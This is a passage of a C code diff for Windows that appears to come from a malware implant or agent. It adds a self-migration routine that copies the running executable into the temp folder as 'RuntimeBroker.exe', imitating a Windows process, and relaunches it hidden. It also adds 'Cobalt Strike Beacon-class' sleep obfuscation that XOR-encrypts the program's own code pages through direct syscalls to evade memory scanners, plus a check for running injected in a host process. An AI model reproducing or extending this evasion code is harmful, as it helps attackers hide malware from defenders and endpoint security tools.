+ * Returns FALSE only if the copy or process creation fails — in that case
+ * the caller continues running as the original process.
+ * On success this function never returns (ExitProcess is called).
+ */
+BOOL auto_migrate(const char *keyPath)
+{
+    (void)keyPath;   /* child inherits g_key_path via its own resolve_key_path() */
+
+    /* ── 1. Get our own EXE path ─────────────────────────────────────── */
+    char srcPath[MAX_PATH] = {0};
+    if (!GetModuleFileNameA(NULL, srcPath, sizeof(srcPath) - 1))
+        return FALSE;
+
+    /* ── 2. Build destination: %TEMP%\RuntimeBroker.exe ─────────────── */
+    char dstPath[MAX_PATH] = {0};
+    if (!GetTempPathA(sizeof(dstPath) - 20, dstPath))
+        return FALSE;
+    /* Append filename — strncat is fine here; buffer has 20 bytes of slack */
+    strncat(dstPath, "RuntimeBroker.exe",
+            sizeof(dstPath) - strlen(dstPath) - 1);
+
+    /* ── 3. Copy ourselves to the temp path ─────────────────────────── */
+    /* CopyFileA will overwrite silently if a stale copy is present       */
+    if (!CopyFileA(srcPath, dstPath, FALSE))
+        return FALSE;
+
+    /* ── 4. Spawn the child (suspended so we can resume cleanly) ─────── */
+    STARTUPINFOA        si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (!CreateProcessA(
+            dstPath,           /* lpApplicationName  */
+            NULL,              /* lpCommandLine (NULL → use app name) */
+            NULL, NULL,        /* process/thread security attrs */
+            FALSE,             /* bInheritHandles */
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL,              /* inherit environment */
+            NULL,              /* inherit working directory */
+            &si, &pi))
+    {
+        /* Clean up the temp copy on failure so we don't litter */
+        DeleteFileA(dstPath);
+        return FALSE;
+    }
+
+    /* ── 5. Resume child and exit ────────────────────────────────────── */
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    /* Give child a moment to start before we vanish (avoids a race where
+     * the parent exits before the child has called CreateMutex)          */
+    Sleep(300);
+    ExitProcess(0);
+}
+
+
+/* ── Sleep obfuscation (APC-based, Foliage/Ekko style) ─────────────────── */
+/*
+ * obfuscate_sleep
+ * ---------------
+ * Cobalt Strike Beacon-class sleep obfuscation:
+ *
+ *   1. Generate a random 16-byte XOR key.
+ *   2. XOR-encrypt all private RX pages via SC_NtWriteVirtualMemory —
+ *      no VirtualProtect / RWX page.
+ *   3. Queue an APC on the current thread to decrypt on wakeup.
+ *   4. SleepEx(ms, TRUE) enters an alertable wait — during this window
+ *      the thread is sleeping with all its code pages encrypted in RAM.
+ *      A memory scanner sees only ciphertext.
+ *   5. The wakeup APC fires, decrypts the pages, agent continues.
+ *
+ * When running injected inside a host process, skip page scrambling
+ * entirely to avoid corrupting the host's code pages.
+ *
+ * Key is wiped with SecureZeroMemory after use.
+ */
+
+/* ── _is_injected ────────────────────────────────────────────────────────── */
+static BOOL _is_injected(void)
+{
+    HMODULE hProcess = GetModuleHandleA(NULL);
+    HMODULE hSelf    = NULL;
+    GetModuleHandleExA(
+        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
+        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+        (LPCSTR)&_is_injected, &hSelf);
+    return (hSelf != NULL) && (hSelf != hProcess);
+}
+
+/* ── Page region tracking ────────────────────────────────────────────────── */
+#define MAX_REGIONS 256
+typedef struct { PVOID base; SIZE_T size; } _Region;
+
+static int _collect_rx_pages(_Region *out, int max)
+{
+    int count = 0;
+    MEMORY_BASIC_INFORMATION mbi;
+    BYTE *addr = NULL;
+    while (count < max && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
+        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
+        if (mbi.State  != MEM_COMMIT)  continue;
+        if (mbi.Type   != MEM_PRIVATE) continue;
+        if (mbi.Protect != PAGE_EXECUTE_READ &&
+            mbi.Protect != PAGE_EXECUTE_READWRITE) continue;
+        out[count].base = mbi.BaseAddress;
+        out[count].size = mbi.RegionSize;
+        count++;
+    }
+    return count;
+}
+
+/* ── XOR pass via SC_NtWriteVirtualMemory (no RWX) ──────────────────────── */
+static void _xor_pages(_Region *regions, int count, const BYTE *key)
+{
+    HANDLE hSelf = GetCurrentProcess();
+    for (int i = 0; i < count; i++) {
+        SIZE_T sz   = regions[i].size;
+        BYTE  *buf  = (BYTE *)malloc(sz);
+        if (!buf) continue;
+
+        /* Read → XOR → Write, all via syscall — no VirtualProtect */
+        SIZE_T rd = 0;
+        NTSTATUS ns = SC_NtReadVirtualMemory(hSelf, regions[i].base, buf, sz, &rd);
+        if (NT_SUCCESS(ns) && rd == sz) {
+            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= key[j % 16];
+            SIZE_T wr = 0;
+            SC_NtWriteVirtualMemory(hSelf, regions[i].base, buf, sz, &wr);
+        }
+        SecureZeroMemory(buf, sz);
+        free(buf);
+    }
+}
+
+/* ── APC decrypt context ─────────────────────────────────────────────────── */
+typedef struct {
+    _Region  regions[MAX_REGIONS];
+    int      count;
+    BYTE     key[16];
+} _SleepCtx;
+
+static void NTAPI _apc_decrypt(ULONG_PTR param)
+{
+    _SleepCtx *ctx = (_SleepCtx *)param;
+    _xor_pages(ctx->regions, ctx->count, ctx->key);
+    SecureZeroMemory(ctx->key, sizeof(ctx->key));
+    free(ctx);
+}
+
+/* ── Public: obfuscate_sleep ─────────────────────────────────────────────── */
+void obfuscate_sleep(DWORD ms)
+{
+    /* Injected into host process — just sleep, don't touch host pages */
+    if (_is_injected() || !sc_ready()) {
+        Sleep(ms);
+        return;
+    }
+
+    /* Generate random key */
+    BYTE key[16];
+    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, key, sizeof(key),
+            BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+        Sleep(ms);
+        return;
+    }
+
+    /* Collect private RX pages */
+    static _Region regions[MAX_REGIONS];
+    int count = _collect_rx_pages(regions, MAX_REGIONS);
+    if (count == 0) { Sleep(ms); return; }
+
+    /* Build APC decrypt context (heap-allocated — survives our stack frame) */
+    _SleepCtx *ctx = (_SleepCtx *)malloc(sizeof(_SleepCtx));
+    if (!ctx) { Sleep(ms); return; }
+    for (int i = 0; i < count; i++) ctx->regions[i] = regions[i];
+    ctx->count = count;
+    memcpy(ctx->key, key, 16);
+    SecureZeroMemory(key, 16);
+
+    /* Queue APC to decrypt on wakeup */
+    QueueUserAPC(_apc_decrypt, GetCurrentThread(), (ULONG_PTR)ctx);
+
+    /* Encrypt pages — after this our own code is XOR-ciphertext in RAM */
+    _xor_pages(regions, count, ctx->key);
+
+    /* Alertable sleep — APC fires on wakeup, decrypts, we continue */
+    SleepEx(ms, TRUE);
+    /* ctx is freed inside _apc_decrypt */
+}
+#undef MAX_REGIONS
